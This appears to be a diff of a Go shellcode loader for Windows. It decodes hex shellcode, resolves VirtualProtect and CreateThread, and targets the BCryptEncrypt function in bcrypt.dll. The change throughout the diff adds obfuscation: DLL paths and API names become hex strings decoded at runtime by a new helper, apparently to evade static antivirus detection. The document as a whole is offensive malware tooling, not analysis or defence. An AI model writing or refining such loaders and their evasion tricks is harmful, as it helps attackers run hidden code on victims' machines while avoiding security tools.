@@ -6,14 +6,12 @@ import (
 	"log"
 	"syscall"
 	"unsafe"
-
-	"golang.org/x/sys/windows"
 )
 
 var (
-	kernel32       = windows.NewLazySystemDLL("kernel32.dll")
-	virtualProtect = kernel32.NewProc("VirtualProtect")
-	createThread   = kernel32.NewProc("CreateThread")
+	kernel32       = syscall.NewLazyDLL(dehex("6b65726e656c33322e646c6c"))
+	virtualProtect = kernel32.NewProc(dehex("5669727475616c50726f74656374"))
+	createThread   = kernel32.NewProc(dehex("437265617465546872656164"))
 
 	// Colores de texto ANSI
 	colorRed    = "\033[31m"
@@ -22,6 +20,13 @@ var (
 	colorReset  = "\033[0m"
 )
 
+func dehex(hexStr string) string {
+	bytes, err := hex.DecodeString(hexStr)
+	if err != nil {
+		log.Fatal(err)
+	}
+	return string(bytes)
+}
 func main() {
 
 	// Shellcode
@@ -29,15 +34,16 @@ func main() {
 	if errShellcode != nil {
 		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
 	}
-	lib, err := syscall.LoadLibrary("C:\\Windows\\System32\\bcrypt.dll")
+	bcryptDllPath := dehex("433a5c57696e646f77735c53797374656d33325c6263727970742e646c6c")
+	lib, err := syscall.LoadLibrary(bcryptDllPath)
 	if err != nil {
 		fmt.Println("Failed to load library:", err)
 		return
 	}
 	fmt.Printf("Address of library bcrypt.dll : 0x%X\n", uintptr(lib))
 
-	// Get the address of the BCryptEncrypt function
-	funcAddress, err := syscall.GetProcAddress(lib, "BCryptEncrypt")
+	funcName := dehex("424372797074456e6372797074")
+	funcAddress, err := syscall.GetProcAddress(lib, funcName)
 	if err != nil {
 		log.Fatal("Failed to get function address:", err)
 	}
